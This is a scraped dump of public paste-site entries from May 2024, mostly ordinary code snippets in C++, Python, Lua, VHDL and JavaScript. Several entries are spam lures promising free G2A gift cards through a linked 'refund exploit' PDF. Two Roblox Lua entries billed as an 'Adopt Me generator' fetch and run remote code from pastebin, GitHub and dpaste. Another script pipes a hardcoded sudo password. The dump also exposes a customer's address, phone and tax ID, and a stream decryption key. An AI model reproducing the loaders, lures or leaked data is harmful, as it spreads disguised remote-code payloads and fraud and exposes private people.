id,title,username,language,date,content
9WkeeQXm,🚀G2A.com Free Gift Card Guide MAY 2024 UPDATED🚀,maryke40,GetText,Friday 24th of May 2024 01:03:17 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon gift cards & everything else offered. 
This is the most up to date version of this script. Any other one posted will not work!

PDF guide here:

https://drive.google.com/file/d/1hT6jDYLXG3Fs_TjIlNYzcppn2Hj0nBzR/view?

Working as of:

24 May 2024"
1gbVn4xB,🎉G2A.com Free Gift Card Guide MAY 2024 UPDATED🔥,maryke40,GetText,Friday 24th of May 2024 01:03:12 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Steam gift cards & everything else offered. 
This is the most up to date version of this script. Any other one posted will not work!

PDF guide here:

https://drive.google.com/file/d/1hT6jDYLXG3Fs_TjIlNYzcppn2Hj0nBzR/view?

Working as of:

24 May 2024"
G4NhSgBs,🔥G2A.com Free Gift Card Guide MAY 2024 UPDATED💰,maryke40,GetText,Friday 24th of May 2024 01:03:00 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Playstation gift cards & everything else offered. 
This is the most up to date version of this script. Any other one posted will not work!

PDF guide here:

https://drive.google.com/file/d/1hT6jDYLXG3Fs_TjIlNYzcppn2Hj0nBzR/view?

Working as of:

24 May 2024"
QcAb32Ug,🔥G2A.com Free Gift Card Guide MAY 2024 UPDATED🚀,maryke40,GetText,Friday 24th of May 2024 01:02:55 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Xbox gift cards & everything else offered. 
This is the most up to date version of this script. Any other one posted will not work!

PDF guide here:

https://drive.google.com/file/d/1hT6jDYLXG3Fs_TjIlNYzcppn2Hj0nBzR/view?

Working as of:

24 May 2024"
P9Hve6fR,🎉G2A.com Free Gift Card Guide MAY 2024 UPDATED💰,maryke40,GetText,Friday 24th of May 2024 12:56:21 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon gift cards & everything else offered. 
This is the most up to date version of this script. Any other one posted will not work!

PDF guide here:

https://drive.google.com/file/d/1hT6jDYLXG3Fs_TjIlNYzcppn2Hj0nBzR/view?usp=g2a_refund_exploit_71021023.pdf

Working as of:

24 May 2024"
Dr0Ec12b,Untitled,Josif_tepe,C++,Friday 24th of May 2024 12:26:26 PM CDT,"#include <iostream>
using namespace std;


int main()
{
    string s;
    cin >> s;

    int i = 0;
    int n = s.size();
    long long res = 1;
    while(i < n) {
        if(s[i] == 'T' or s[i] == 't') {
            res *= 3;
            i += 8;
        }
        else if(s[i] == 'D' or s[i] == 'd') {
            res *= 2;
            i += 5;
        }
        else {
            res -= 1;
            i += 5;
        }

    }
    cout << res << endl;
    
    
    return 0;
}
"
E9vjN8MK,plot_test_arrays,Python253,Python,Friday 24th of May 2024 12:17:41 PM CDT,"#!/usr/bin/env python
# -*- coding: utf-8 -*-
# Filename: plot_test_arrays.py
# Version: 1.0.0
# Author: Jeoi Reqi

""""""
Description:
    This script reads a file containing arrays and plots each array with smooth splines and data point markers.
    It opens each plot individually and allows the user to interact with it, save the image, and then close the plot window.

Requirements:
    - Python 3.x
    - matplotlib
    - numpy
    - scipy

Functions:
    - read_arrays_from_file(filename):
        Reads arrays from a file.
    - plot_array_with_spline(data_array):
        Plots a single array with smooth splines and data point markers.
    - select_file():
        Prompts the user to select a file from the current working directory.

Usage:
    - Run the script and select the file containing the arrays to plot.
""""""

import matplotlib.pyplot as plt
import numpy as np
from scipy.interpolate import make_interp_spline
import re
import os
import sys
from tkinter import Tk
from tkinter.filedialog import askopenfilename

def read_arrays_from_file(filename):
    """"""
    Read arrays from a file.

    Parameters:
    filename (str): The name of the file to read the arrays from.

    Returns:
    list: A list of arrays read from the file.
    """"""
    arrays = []
    with open(filename, 'r') as file:
        for line in file:
            match = re.search(r'\[(.*)\]', line)
            if match:
                array_str = match.group(1)
                array = [float(num) for num in array_str.split(', ')]
                arrays.append(array)
    return arrays

def plot_array_with_spline(data_array):
    """"""
    Plot a single array with smooth splines and data point markers.

    Parameters:
    data_array (list): The array to plot.
    """"""
    x = np.arange(len(data_array))
    y = data_array
    spline = make_interp_spline(x, y)
    x_smooth = np.linspace(x.min(), x.max(), 300)
    y_smooth = spline(x_smooth)

    plt.plot(x_smooth, y_smooth, color='red', linewidth=2, label='Smooth Spline')
    plt.scatter(x, y, color='blue', marker='o', label='Array Points')
    plt.fill_between(x_smooth, y_smooth, color='pink', alpha=0.3)  # Fill under the spline with color
    for j, txt in enumerate(data_array):
        plt.annotate('{:.2f}'.format(txt), (x[j], y[j]), textcoords=""offset points"", xytext=(0,10), ha='center')
    plt.xlabel('Index')
    plt.ylabel('Value')
    plt.title('Array Plot with Smooth Spline')
    plt.legend()
    plt.grid(True)

def select_file():
    """"""
    Prompts the user to select a file from the current working directory.

    Returns:
    str: The selected file path.
    """"""
    root = Tk()
    root.withdraw()  # Hide the main window
    filepath = askopenfilename(initialdir=os.getcwd(), title=""Select a file"", filetypes=[(""Text files"", ""*.txt"")])
    root.destroy()  # Destroy the Tkinter window
    return filepath

if __name__ == ""__main__"":
    # Prompt the user to select a file containing the arrays
    print(""\nSelect the file containing the arrays to plot.\n"")
    file_path = select_file()
    # Catch if the user cancels selection & exit gracefully
    if not file_path:
        print(""\tNo file selected!\n\nExiting Program...   GoodBye!\n"")
        sys.exit(1)

    # Read arrays from the selected file
    arrays = read_arrays_from_file(file_path)

    # Plot each array
    for i, array in enumerate(arrays, start=1):
        print(""Plotting Array {}..."".format(i))
        plot_array_with_spline(array)
        plt.show()
    
    # Exit program
    print(""\nAll plots are complete.\n\nExiting program...   GoodBye!"")
    sys.exit(0)
"
dhLx53sA,generate_test_arrays,Python253,Python,Friday 24th of May 2024 12:16:41 PM CDT,"#!/usr/bin/env python
# -*- coding: utf-8 -*-
# Filename: generate_test_arrays.py
# Version: 1.0.0
# Author: Jeoi Reqi

""""""
Description:
    This script generates a file with 10 lines of arrays for testing purposes.
    Each array contains random floating-point numbers.

Requirements:
    - Python 3.x

Functions:
    - generate_random_arrays(num_arrays, array_length):
        Generates a list of arrays with random floating-point numbers.
    - save_arrays_to_file(arrays, filename):
        Saves the generated arrays to a file.

Usage:
    - Run the script to generate a file named 'test_arrays.txt' in the current working directory.
""""""

import numpy as np

def generate_random_arrays(num_arrays=10, array_length=10):
    """"""
    Generate a list of arrays with random floating-point numbers.

    Parameters:
    num_arrays (int): Number of arrays to generate.
    array_length (int): Length of each array.

    Returns:
    list: A list of arrays with random floating-point numbers.
    """"""
    generated_arrays = []
    for _ in range(num_arrays):
        random_array = np.random.uniform(low=-5.0, high=5.0, size=array_length).tolist()
        generated_arrays.append(random_array)
    return generated_arrays

def save_arrays_to_file(arrays, filename='test_arrays.txt'):
    """"""
    Save the generated arrays to a file.

    Parameters:
    arrays (list): A list of arrays to save.
    filename (str): The name of the file to save the arrays to.
    """"""
    with open(filename, 'w', encoding='utf-8') as file:
        for index, array in enumerate(arrays, start=1):
            array_str = ', '.join(f'{x:.4f}' for x in array)
            file.write(f""{index} - Item {index} - [{array_str}]\n"")

if __name__ == ""__main__"":
    # Generate 10 arrays with 10 random floating-point numbers each
    num_arrays_to_generate = 10
    array_length_to_generate = 10
    arrays_to_save = generate_random_arrays(num_arrays_to_generate, array_length_to_generate)
    
    # Save the arrays to 'test_arrays.txt'
    save_arrays_to_file(arrays_to_save)
    
    print(f""Generated {num_arrays_to_generate} arrays and saved to 'test_arrays.txt'"")
"
AtzqrbVG,🤑 G2A.com Free Gift Card Guide May 2024 FIX 🎁,ssss50w,GetText,Friday 24th of May 2024 12:15:28 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.

This is the most up to date version of this script. Any other one posted will not work!
 
PDF guide here:
https://drive.google.com/file/d/1KMb0fLkKHIC2qdjR4vCSRH9rVSjJVMdX/view

Working as of:
24 May 2024"
8SXiTNRB,Untitled,zerof3565,Python,Friday 24th of May 2024 12:09:27 PM CDT,"import gradio as gr
import psutil
import subprocess
import os
import threading
import time

def get_cpu_load():
    load1, load5, load15 = os.getloadavg()
    return f""1 min: {load1:.2f}, 5 min: {load5:.2f}, 15 min: {load15:.2f}""

def get_cpu_utilization():
    return f""{psutil.cpu_percent(interval=1):.2f} %""

def get_top_processes_by_ram():
    processes = sorted(psutil.process_iter(['pid', 'name', 'memory_info']), key=lambda p: p.info['memory_info'].rss, reverse=True)[:5]
    return ""\n"".join([f""{p.info['name']} (PID: {p.info['pid']}): {p.info['memory_info'].rss / (1024 ** 2):.2f} MB"" for p in processes])

def get_top_processes_by_cpu():
    processes = sorted(psutil.process_iter(['pid', 'name', 'cpu_percent']), key=lambda p: p.info['cpu_percent'], reverse=True)[:5]
    return ""\n"".join([f""{p.info['name']} (PID: {p.info['pid']}): {p.info['cpu_percent']:.2f} %"" for p in processes])

def get_disk_partitions():
    partitions = psutil.disk_partitions()
    usage = [psutil.disk_usage(part.mountpoint) for part in partitions]
    return ""\n"".join([f""{part.device}: {use.percent:.2f} % used"" for part, use in zip(partitions, usage)])

def get_kvm_machines():
    command = 'echo ""mypasswordyo"" | sudo -S virsh list --all'
    result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    return result.stdout

def ping_test():
    response = os.system(""ping -c 1 1.1.1.1 > /dev/null 2>&1"")
    return ""Connected"" if response == 0 else ""Not Connected""

internet_status = ""Unknown""

def update_internet_connectivity():
    global internet_status
    while True:
        internet_status = ping_test()
        time.sleep(60)

threading.Thread(target=update_internet_connectivity, daemon=True).start()

with gr.Blocks() as demo:
    gr.Markdown(""# Server Metrics Dashboard"")

    with gr.Row():
        with gr.Column():
            gr.Markdown(""## CPU Load (1/5/15 min)"")
            cpu_load = gr.Textbox(label=""CPU Load"", interactive=False)

        with gr.Column():
            gr.Markdown(""## CPU Utilization"")
            cpu_utilization = gr.Textbox(label=""CPU Utilization"", interactive=False)

        with gr.Column():
            gr.Markdown(""## Top Processes by RAM"")
            processes_by_ram = gr.Textbox(label=""Processes by RAM"", interactive=False)

        with gr.Column():
            gr.Markdown(""## Top Processes by CPU"")
            processes_by_cpu = gr.Textbox(label=""Processes by CPU"", interactive=False)

        with gr.Column():
            gr.Markdown(""## Disk Partitions"")
            disk_partitions = gr.Textbox(label=""Disk Partitions"", interactive=False)

        with gr.Column():
            gr.Markdown(""## KVM Machines"")
            kvm_machines = gr.Textbox(label=""KVM Machines"", interactive=False)

        with gr.Column():
            gr.Markdown(""## Internet Connectivity"")
            internet_connectivity = gr.Textbox(label=""Internet Connectivity"", interactive=False)

    def update_metrics():
        return (
            get_cpu_load(),
            get_cpu_utilization(),
            get_top_processes_by_ram(),
            get_top_processes_by_cpu(),
            get_disk_partitions(),
            get_kvm_machines(),
            internet_status
        )

    demo.load(update_metrics, inputs=[], outputs=[
        cpu_load,
        cpu_utilization,
        processes_by_ram,
        processes_by_cpu,
        disk_partitions,
        kvm_machines,
        internet_connectivity
    ], every=5)

demo.launch(server_name=""0.0.0.0"", server_port=7860)"
2WuddXpy,🤑 G2A.com Free Gift Card Guide May 2024 FIX 🤑,jusst2k4,GetText,Friday 24th of May 2024 12:02:03 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.

This is the most up to date version of this script. Any other one posted will not work!
 
PDF guide here:
https://drive.google.com/file/d/1thJ3r_goEZ3BA-wE8sNYbGUhGv6gTnXz/view?usp=g2a_refund_exploit_657962.pdf

Working as of:
24 May 2024"
EnYDSrkp,MEItemComparer,AkaShiroKage,Lua,Friday 24th of May 2024 11:58:10 AM CDT,"local ME = peripheral.find(""meBridge"")
local deuterium = {
  name = ""gtceu:deuterium"",
  amount = 1
}

local function getFluid(fluid)
  local fluids = ME.listFluid()
  local serFluids = textutils.serialise(fluids)
  local start = string.find(serFluids, ""name = \"""" .. fluid)
  local sEnd = string.find(serFluids, ""}"", start)

  assert(start ~= nil)
  return string.sub(serFluids, start, sEnd)

end

local tritium = {
  name = ""gtceu:tritium"",
  amount = 1
}

local tritiumFromDeuteriumCraft = {
  name = ""gtceu:tritium"",
  count = 160
}

local function dump(o)
   if type(o) == 'table' then
      local s = '{ '
      for k,v in pairs(o) do
         if type(k) ~= 'number' then k = '""'..k..'""' end
         s = s .. '['..k..'] = ' .. dump(v) .. ','
      end
      return s .. '} '
   else
      return tostring(o)
   end
end

-- check for equal item stacks --
local function compareItems(itemA, itemB)

  return ME.getItem(itemA).name == ME.getItem(itemB).name
end

print(getFluid(deuterium.name))
--compareItems(deuterium, tritium)"
Q0PPvZdC,Adopt Me • Generator ^^2,Bacon_Script,Lua,Friday 24th of May 2024 11:52:18 AM CDT,"loadstring(game:HttpGet(""https://pastebin.com/raw/9pBsUXQ5""))()"
9pBsUXQ5,Adopt me • Generator,Bacon_Script,Lua,Friday 24th of May 2024 11:48:48 AM CDT,"local PabloLib = loadstring(game:HttpGet(""https://raw.githubusercontent.com/BatuKvi123/PabloLibV3/main/PabloLibV3""))()

local window = PabloLib:Create(
""ADOPT ME [AUTOFARM]"", -- Name here.
""Enabled"", -- If you want draggable set here to ""Enabled"" if you dont want set to ""Disabled"".
""p"" -- You can put any keybind here to open close.
)

local tab1 = window:CreateTab(""SCRIPT"")
tab1:CreateButton(""Generate Your Script"", function()
loadstring(game:HttpGet(""https://raw.githubusercontent.com/JulHubz/JulHub/main/JulHub""))()
loadstring(game:HttpGet(""https://dpaste.com/C69Y5S3X2.txt""))()
end)

tab1:CreateInfo(""Discord: https://discord.com/invite/3sW2kjHZTU"")
"
947cefFn,order_json,lgarcia_ebcomm,JSON,Friday 24th of May 2024 11:44:45 AM CDT,"{
    ""order"": {
        ""info"": {
            ""order_id"": 42,
            ""currency"": ""MXN"",
            ""currency_value"": ""1.0000"",
            ""payment_method"": ""Pago al Entregar"",
            ""payment_module_code"": ""cod"",
            ""shipping_method"": ""Env\u00edo Gratuito! (Env\u00edo Gratuito)"",
            ""shipping_module_code"": ""freeshipper"",
            ""coupon_code"": """",
            ""cc_type"": """",
            ""cc_owner"": """",
            ""cc_number"": """",
            ""cc_cvv"": null,
            ""cc_expires"": """",
            ""date_purchased"": ""2024-05-22 12:28:14"",
            ""orders_status"": ""1"",
            ""total"": ""9348.00"",
            ""tax"": ""0.00"",
            ""last_modified"": null,
            ""ip_address"": ""187.161.117.69 - 187.161.117.69"",
            ""language_code"": ""es"",
            ""order_weight"": ""0"",
            ""comments"": """",
            ""tax_groups"": {
                ""0.0000"": ""1""
            },
            ""status_history"": [
                {
                    ""orders_status_history_id"": ""71"",
                    ""orders_status_id"": ""1"",
                    ""date_added"": ""2024-05-22 12:28:14"",
                    ""customer_notified"": ""1"",
                    ""comments"": """",
                    ""updated_by"": """",
                    ""track_id"": """",
                    ""order_total"": null
                }
            ]
        },
        ""totals"": [
            {
                ""title"": ""Subtotal:"",
                ""text"": ""$9,348.00"",
                ""class"": ""ot_subtotal"",
                ""value"": ""9348.0000"",
                ""sort_order"": ""100""
            },
            {
                ""title"": ""Env\u00edo Gratuito! (Env\u00edo Gratuito):"",
                ""text"": ""$0.00"",
                ""class"": ""ot_shipping"",
                ""value"": ""0.0000"",
                ""sort_order"": ""200""
            },
            {
                ""title"": ""Impuesto de venta + IVA:"",
                ""text"": ""$0.00"",
                ""class"": ""ot_tax"",
                ""value"": ""0.0000"",
                ""sort_order"": ""300""
            },
            {
                ""title"": ""Total:"",
                ""text"": ""$9,348.00"",
                ""class"": ""ot_total"",
                ""value"": ""9348.0000"",
                ""sort_order"": ""999""
            }
        ],
        ""products"": [
            {
                ""qty"": 1,
                ""id"": ""53"",
                ""type"": ""1"",
                ""orders_products_id"": ""45"",
                ""name"": ""MOTOROLA G24\u00a08+256GB<p>(MOTOXT2425AZ)<\/p><br>(MOTOXT2425AZ)"",
                ""model"": ""MOTOXT2425"",
                ""tax"": ""0.0000"",
                ""price"": ""9348.0000"",
                ""final_price"": ""9348.0000"",
                ""onetime_charges"": ""0.0000"",
                ""products_priced_by_attribute"": ""0"",
                ""product_is_free"": ""0"",
                ""products_discount_type"": ""0"",
                ""products_discount_type_from"": ""0"",
                ""products_weight"": ""0"",
                ""products_virtual"": 0,
                ""product_is_always_free_shipping"": 1,
                ""products_quantity_order_min"": ""1"",
                ""products_quantity_order_units"": ""1"",
                ""products_quantity_order_max"": ""0"",
                ""products_quantity_mixed"": 1,
                ""products_mixed_discount_quantity"": 1,
                ""products_prid"": ""53:6e88e5c1b64d0828710309754f1625b1"",
                ""attributes"": [
                    {
                        ""option"": ""Periodo de plan"",
                        ""value"": ""12 Meses"",
                        ""option_id"": ""4"",
                        ""value_id"": ""12"",
                        ""prefix"": ""+"",
                        ""price"": ""0.0000"",
                        ""product_attribute_is_free"": 0
                    },
                    {
                        ""option"": ""Color"",
                        ""value"": ""Azul"",
                        ""option_id"": ""1"",
                        ""value_id"": ""5"",
                        ""prefix"": ""+"",
                        ""price"": ""0.0000"",
                        ""product_attribute_is_free"": 0
                    },
                    {
                        ""option"": ""Capacidad"",
                        ""value"": ""256 GB"",
                        ""option_id"": ""2"",
                        ""value_id"": ""18"",
                        ""prefix"": ""+"",
                        ""price"": ""0.0000"",
                        ""product_attribute_is_free"": 0
                    },
                    {
                        ""option"": ""Plan"",
                        ""value"": ""PLAN MAX"",
                        ""option_id"": ""0"",
                        ""value_id"": ""0"",
                        ""prefix"": """",
                        ""price"": ""0.0000"",
                        ""product_attribute_is_free"": 0
                    }
                ],
                ""subproduct"": {
                    ""product_model"": ""MOTOXT2425AZ""
                }
            }
        ],
        ""customer"": {
            ""id"": ""6"",
            ""name"": ""Luis Alejandro Ortiz"",
            ""company"": ""EBCOMM SOLUCIONES"",
            ""street_address"": ""Calle 16 de noviembre"",
            ""ext_number"": ""501"",
            ""int_number"": ""123"",
            ""suburb"": ""Nuevo Repueblo"",
            ""city"": ""Monterrey"",
            ""postcode"": ""64700"",
            ""state"": ""Nuevo Le\u00f3n"",
            ""country"": ""Mexico"",
            ""format_id"": ""1"",
            ""telephone"": ""8115616646"",
            ""fax"": ""8115616646"",
            ""email_address"": ""lgarcia@ebcomm.mx""
        },
        ""delivery"": {
            ""name"": ""Luis Alejandro Ortiz"",
            ""company"": ""EBCOMM SOLUCIONES"",
            ""street_address"": ""Calle 16 de noviembre"",
            ""ext_number"": ""501"",
            ""int_number"": ""123"",
            ""suburb"": ""Nuevo Repueblo"",
            ""city"": ""Monterrey"",
            ""postcode"": ""64700"",
            ""state"": ""Nuevo Le\u00f3n"",
            ""country"": ""Mexico"",
            ""format_id"": ""1""
        },
        ""billing"": {
            ""name"": ""Luis Alejandro Ortiz"",
            ""company"": ""EBCOMM SOLUCIONES"",
            ""rfc"": ""GAOL851101QN9"",
            ""street_address"": ""Calle 16 de noviembre"",
            ""ext_number"": ""501"",
            ""int_number"": ""123"",
            ""suburb"": ""Nuevo Repueblo"",
            ""city"": ""Monterrey"",
            ""postcode"": ""64700"",
            ""state"": ""Nuevo Le\u00f3n"",
            ""country"": ""Mexico"",
            ""format_id"": ""1"",
            ""invoice_request"": {
                ""cfdi_code"": ""D01"",
                ""fiscal_regime_code"": ""605"",
                ""sat_cfdi_usage_description"": ""Honorarios m\u00e9dicos, dentales y gastos hospitalarios"",
                ""sat_fiscal_regime_description"": ""Sueldos y Salarios e Ingresos Asimilados a Salarios""
            }
        },
        ""content_type"": null,
        ""email_low_stock"": null,
        ""products_ordered_attributes"": null,
        ""products_ordered"": null,
        ""products_ordered_email"": null,
        ""products_ordered_html"": null,
        ""attachArray"": null,
        ""email_order_message"": null,
        ""extra_header_text"": null,
        ""doStockDecrement"": null,
        ""send_low_stock_emails"": null,
        ""queryReturnFlag"": null,
        ""bestSellersUpdate"": null,
        ""use_external_tax_handler_only"": null,
        ""subtotal"": null,
        ""total_tax"": null,
        ""total_weight"": null,
        ""total_cost"": null,
        ""products_ordered_attributes_html"": [],
        ""delivery_boxes"": null,
        ""email_template"": ""checkout"",
        ""hide_delivery_info"": false
    }
}"
e89U9rW5,javascript classes,runnig,JavaScript,Friday 24th of May 2024 11:06:46 AM CDT,"// @ts-check

class Title {
  #title;

  /**
   * @param {string} title 
   */
  constructor(title) {
    if (typeof title != 'string') {
      throw new Error('input argument must be a string');
    }
    if (title.length > 80) {
      throw new Error('Title is too long');
    }
    this.#title = title;
  }

  get title() {
    return this.#title;
  }
}

class Content {
  #content;
  /** @param {string} content */
  constructor(content) {
    if (typeof content != 'string') {
      throw new Error('input argument must be a string');
    }
    this.#content = content;
  }

  get content() {
    return this.#content;
  }
}

class Url {
  #url;
  /** @param {string} url */
  constructor(url) {
    if (typeof url != 'string') {
      throw new Error('input argument must be a string');
    }
    if (!url.startsWith('http://') && !url.startsWith('https://')) {
      throw new Error('Invalid URL');
    }
    this.#url = url;
  }

  get url() {
    return this.#url;
  }
}


class Post {
  /**
   * @param {Title} title 
   * @param {Content} content 
   * @param {Url} imageUrl 
   */
  constructor(title, content, imageUrl) {
    if (!(title instanceof Title)) {
      throw new Error('title must be an instance of Title');
    }
    if (!(content instanceof Content)) {
      throw new Error('content must be an instance of Content');
    }
    if (!(imageUrl instanceof Url)) {
      throw new Error('imageUrl must be an instance of Url');
    }
    this._title = title;
    this._content = content;
    this._imageUrl = imageUrl;
  }

  /** @returns {string} */
  get title() {
    return this._title.title;
  }

  /** @returns {string} */
  get content() {
    return this._content.content;
  }

  /** @returns {string} */
  get imageUrl() {
    return this._imageUrl.url;
  }

  toString() {
    return `${this.title}\n${this.content}\n${this.imageUrl}`;
  }
}

const post = new Post(
  new Title('This is a title.'),
  new Content('This is a post.'),
  new Url('http://example.com'));

console.log(post.toString());
"
0YDwsnkL,love4k.json,Saleng,JSON,Friday 24th of May 2024 11:05:02 AM CDT,"{""mid"":""501"",""title"":""love4k"",""seo"":""love4k"",""alt_lang1"":""love4k"",""poster"":""https://upload.wikimedia.org/wikipedia/en/1/1d/Love_Nature_TV.png"",""views"":10829043,""clearKeys"":""7d0b58f6ba324ad5bf123a8098e3ad2f:45906f0ddd1e4c28ba9e9dc138d75da8"",""linkvideo"":""https://ubn-streamer1.cdn.3bbtv.com:8443/3bb/live/501/501.mpd"",""link"":null}"
MKGFktfu,ARM_RAMB_4kx32,madegoff,VHDL,Friday 24th of May 2024 11:02:05 AM CDT,"--------------------------------------------------------------------------------
--	Wrapper um Basys3-Blockram fuer den RAM des HWPR-Prozessors.
--------------------------------------------------------------------------------
--	Datum:		23.05.2022
--	Version:	1.1
--------------------------------------------------------------------------------

library ieee;
use ieee.std_logic_1164.all;
use ieee.numeric_std.all;

entity ArmRAMB_4kx32 is
	generic(
--------------------------------------------------------------------------------
--	SELECT_LINES ist fuer das HWPR irrelevant, wird aber in einer
--	komplexeren Variante dieses Speichers zur Groessenauswahl
--	benoetigt. Im Hardwarepraktikum bitte ignorieren und nicht aendern.
--------------------------------------------------------------------------------
		SELECT_LINES : natural range 0 to 2 := 1);
    port(
		RAM_CLK	: in  std_logic;
        ENA		: in  std_logic;
		ADDRA	: in  std_logic_vector(11 downto 0);
        WEB		: in  std_logic_vector(3 downto 0);
        ENB		: in  std_logic;
		ADDRB	: in  std_logic_vector(11 downto 0);
        DIB		: in  std_logic_vector(31 downto 0);
        DOA		: out  std_logic_vector(31 downto 0);
        DOB		: out  std_logic_vector(31 downto 0));
end entity ArmRAMB_4kx32;


architecture behavioral of ArmRAMB_4kx32 is
    
    type ram_type is array (4095 downto 0) of std_logic_vector(31 downto 0);
    signal RAM : ram_type;
    begin
    WRITE_AND_READ: process(RAM_CLK)
    begin
        if(rising_edge(RAM_CLK)) then
            if (ENA = '1') then --wenn enable A, lesen aus dem RAM anstelle (int) der entsprechenden Register Adresse
                DOA <= RAM(to_integer(unsigned(ADDRA))); 
            end if;
        
            -- DIB hat die Form: |++++|++++|++++|++++| besteht aus 32 Bit - 4 Bloecken
        
            if (ENB = '1') then --wenn enable B, kann man aus B lesen oder auf B schreiben, je nach WEB
                if (WEB = ""0000"") then --lesezugriff auf port B
                    DOB <= RAM(to_integer(unsigned(ADDRB)));
                end if;
            
                if (WEB(0) = '1') then --erstes block (die letzten 8Bit) schreiben 
                    RAM(to_integer(unsigned(ADDRB)))(7 downto 0) <= DIB(7 downto 0);
                end if;
                if (WEB(1) = '1') then -- zweites block
                    RAM(to_integer(unsigned(ADDRB)))(15 downto 8) <= DIB(15 downto 8);
                end if;
                if (WEB(2) = '1') then --drittes block
                    RAM(to_integer(unsigned(ADDRB)))(23 downto 16) <= DIB(23 downto 16);
                end if;
                if (WEB(3) = '1') then --viertes block
                    RAM(to_integer(unsigned(ADDRB)))(31 downto 24) <= DIB(31 downto 24);
                end if;
            end if;
        end if;
                        
    end process;
end architecture behavioral;
"
1suDECV5,GTM Snippet - mozzshieldrepellent,prabapro,JavaScript,Friday 24th of May 2024 10:51:15 AM CDT,"<!-- 1. In the <head> tag -->
<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
'https://metrics.mozzshieldrepellent.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
})(window,document,'script','dataLayer','GTM-W94L8P2K');</script>
<!-- End Google Tag Manager -->

<!-- 2. Immediately after the opening <body> tag -->
<noscript><iframe src=""https://metrics.mozzshieldrepellent.com/ns.html?id=GTM-W94L8P2K""
height=""0"" width=""0"" style=""display:none;visibility:hidden""></iframe></noscript>
<!-- End Google Tag Manager (noscript) -->"
0bGHzfF9,Untitled,MeehoweCK,C++,Friday 24th of May 2024 10:25:55 AM CDT,"#include <iostream>
#include <ctime>

using namespace std;

const int ROZMIAR{ 6 };

bool czyJuzJest(int liczba, int tablica[], int n) {
	for (auto i{ 0 }; i < n; ++i) {
		if (tablica[i] == liczba) {
			return true;
		}
	}
	return false;
}

void wypelni(int tab[]) {
	for (int i = 0; i < ROZMIAR; ++i) {
		int losowa;
		do {
			losowa = rand() % 49 + 1;
		} while (czyJuzJest(losowa, tab, i));
		tab[i] = losowa;
	}
}

void wyswietl(int tab[]) {
	for (int i = 0; i < ROZMIAR; ++i) {
		cout << tab[i] << ' ';
	}
	cout << endl;
}

int main() {
	int tab[ROZMIAR];
	srand(time(nullptr));
	wypelni(tab);
	wyswietl(tab);
	return 0;
}"
zZADNDyf,Sirma Academy - Arrays - 13. Negative / Positive Numbers,AtanasStoyanov,JavaScript,Friday 24th of May 2024 10:24:01 AM CDT,"function prependNegatives(numbers) {
  const resultNumbers = [];

  numbers.forEach((currentNumber) => {
    if (currentNumber < 0) {
      resultNumbers.unshift(currentNumber);
    } else {
      resultNumbers.push(currentNumber);
    }
  });

  resultNumbers.forEach((number) => console.log(number));
}

prependNegatives([7, -2, 8, 9]);
prependNegatives([3, -2, 0, -1]);
"
fiaZaGBa,Sirma Academy - Arrays - 11. Rotate Array (recursion),AtanasStoyanov,JavaScript,Friday 24th of May 2024 10:23:15 AM CDT,"function rotate(arr) {
  const arrLength = arr.length;
  const lastElement = arr[arrLength - 1]; 
  for (let index = arrLength - 1; index > 0; index--) {
    arr[index] = arr[index - 1];
  }
  arr[0] = lastElement;
}

function rotateArray(arr, rotations) {
  for (let i = 0; i < rotations; i++) {
    rotate(arr);    
  }
  console.log(arr.join("" ""));
}

rotateArray(['1', '2', '3', '4'], 2);
rotateArray(['Banana', 'Orange', 'Coconut', 'Apple'], 15);
"
EHgiyKZT,Beta 1.7V1,Shiko5303,Lua,Friday 24th of May 2024 10:22:18 AM CDT,gg.sleep(10)
xq7vJgFq,Python summarizer,joxeankoret,Python,Friday 24th of May 2024 10:09:41 AM CDT,"#!/usr/bin/python3

import sys
import nltk

#-------------------------------------------------------------------------------
stmts = [
  ""disassemble 10 first instructions at main"",
  ""pet 10 cats and 2 rabbits"",
  ""what's the weather like in california"",
  ""Diaphora 3.0 checkpoint at end of March 2023""
]

INTERESTING = [
  ""JJ"", ""CD"", ""NN""
]

#-------------------------------------------------------------------------------
def summarize(sentence):
  tokens = nltk.word_tokenize(sentence)
  tagged = nltk.pos_tag(tokens)
  entities = nltk.chunk.ne_chunk(tagged)
  
  summary = []
  for ent in entities:
    for inte in INTERESTING:
      if ent[1].startswith(inte):
        summary.append(ent)

  print("">Sentence:"", repr(sentence))
  print("">Summary :"", list(summary))
  print("">Entities:"", list(entities))
  print()

#-------------------------------------------------------------------------------
def main():
  for stmt in stmts:
    summarize(stmt)

if __name__ == ""__main__"":
  main()

"
FhDgYMVn,Untitled,rezamalik15,HTML,Friday 24th of May 2024 10:04:32 AM CDT,"<!DOCTYPE html>
<html lang=""en"">
<head>
    <meta charset=""UTF-8"">
    <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">
    <title>Todo List</title>
    <link href=""https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css"" rel=""stylesheet"" integrity=""sha384-QWTKZyjpPEjISv5WaRU9OFeRpok6YctnYmDr5pNlyT2bRjXh0JMhjY6hW+ALEwIH"" crossorigin=""anonymous"">
</head>
<body>

    <main class=""container"">
        <div class=""row vh-100"">
            <div class=""col-lg-6 col-md-8 col-10 p-3 m-auto border rounded-3 shadow"">
                <h1 class=""p-2 text-primary text-center border-bottom"">
                    Todo List
                </h1>
                <form action=""{% url 'todo-add' %}"" method=""post"">
                    {% csrf_token %}
                    <div class=""input-group mb-3"">
                        <input class=""form-control"" type=""text"" name=""todo"" placeholder=""Enter your new todo"">
                        <button type=""submit"" class=""btn btn-primary"">Add</button>
                    </div>
                </form>
